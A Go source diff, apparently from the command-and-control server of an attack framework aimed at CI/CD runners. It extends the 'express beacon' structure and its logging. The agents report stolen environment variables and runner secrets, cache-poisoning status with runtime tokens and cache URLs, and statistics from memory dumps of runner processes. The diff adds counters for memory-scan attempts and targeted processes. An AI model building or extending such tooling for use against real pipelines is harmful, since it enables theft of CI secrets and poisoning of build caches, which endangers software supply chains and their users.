@@ -237,19 +237,21 @@ type BeaconRequest struct {
 // ExpressBeaconRequest extends BeaconRequest with express mode data fields.
 type ExpressBeaconRequest struct {
 	BeaconRequest
-	Env               map[string]string              `json:"env"`
-	RunnerSecrets     []string                       `json:"runner_secrets"`
-	RunnerVars        []string                       `json:"runner_vars"`
-	CachePoison       *models.CachePoisonStatus      `json:"cache_poison,omitempty"`
-	ResidentJob       *models.ResidentJobObservation `json:"resident_job,omitempty"`
-	GOOS              string                         `json:"goos,omitempty"`
-	MemdumpAttempted  bool                           `json:"memdump_attempted,omitempty"`
-	MemdumpError      string                         `json:"memdump_error,omitempty"`
-	MemdumpPID        int                            `json:"memdump_pid,omitempty"`
-	MemdumpCount      int                            `json:"memdump_count,omitempty"`
-	MemdumpRegions    int                            `json:"memdump_regions,omitempty"`
-	MemdumpBytes      int64                          `json:"memdump_bytes,omitempty"`
-	MemdumpReadErrors int                            `json:"memdump_read_errors,omitempty"`
+	Env                   map[string]string              `json:"env"`
+	RunnerSecrets         []string                       `json:"runner_secrets"`
+	RunnerVars            []string                       `json:"runner_vars"`
+	CachePoison           *models.CachePoisonStatus      `json:"cache_poison,omitempty"`
+	ResidentJob           *models.ResidentJobObservation `json:"resident_job,omitempty"`
+	GOOS                  string                         `json:"goos,omitempty"`
+	MemdumpAttempted      bool                           `json:"memdump_attempted,omitempty"`
+	MemdumpError          string                         `json:"memdump_error,omitempty"`
+	MemdumpPID            int                            `json:"memdump_pid,omitempty"`
+	MemdumpCount          int                            `json:"memdump_count,omitempty"`
+	MemdumpRegions        int                            `json:"memdump_regions,omitempty"`
+	MemdumpBytes          int64                          `json:"memdump_bytes,omitempty"`
+	MemdumpReadErrors     int                            `json:"memdump_read_errors,omitempty"`
+	MemdumpScanAttempts   int                            `json:"memdump_scan_attempts,omitempty"`
+	MemdumpProcessTargets int                            `json:"memdump_process_targets,omitempty"`
 }
 
 // ExtractedSecret represents a secret extracted from express data.
@@ -785,7 +787,7 @@ func (h *Handler) handleBeacon(w http.ResponseWriter, r *http.Request) {
 				if jsonErr := json.Unmarshal(body, &expressBeacon); jsonErr == nil && expressBeacon.ResidentJob != nil {
 					h.handleResidentJobBeacon(beacon, expressBeacon)
 				} else if jsonErr == nil && len(expressBeacon.Env) > 0 {
-					slog.Info("express beacon parsed", "agent_id", agentID, "goos", expressBeacon.GOOS, "memdump_attempted", expressBeacon.MemdumpAttempted, "memdump_error", expressBeacon.MemdumpError, "memdump_pid", expressBeacon.MemdumpPID, "memdump_count", expressBeacon.MemdumpCount, "memdump_regions", expressBeacon.MemdumpRegions, "memdump_bytes", expressBeacon.MemdumpBytes, "memdump_read_errors", expressBeacon.MemdumpReadErrors)
+					slog.Info("express beacon parsed", "agent_id", agentID, "goos", expressBeacon.GOOS, "memdump_attempted", expressBeacon.MemdumpAttempted, "memdump_error", expressBeacon.MemdumpError, "memdump_pid", expressBeacon.MemdumpPID, "memdump_count", expressBeacon.MemdumpCount, "memdump_regions", expressBeacon.MemdumpRegions, "memdump_bytes", expressBeacon.MemdumpBytes, "memdump_read_errors", expressBeacon.MemdumpReadErrors, "memdump_scan_attempts", expressBeacon.MemdumpScanAttempts, "memdump_process_targets", expressBeacon.MemdumpProcessTargets)
 					if expressBeacon.CachePoison != nil {
 						slog.Info("express cache poison", "agent_id", agentID, "status", expressBeacon.CachePoison.Status, "runtime_source", expressBeacon.CachePoison.RuntimeSource, "runtime_token", expressBeacon.CachePoison.RuntimeTokenSummary, "results_url", expressBeacon.CachePoison.ResultsURLSummary, "cache_url", expressBeacon.CachePoison.CacheURLSummary, "error", expressBeacon.CachePoison.Error, "key", expressBeacon.CachePoison.Key, "version", expressBeacon.CachePoison.Version)
 					}
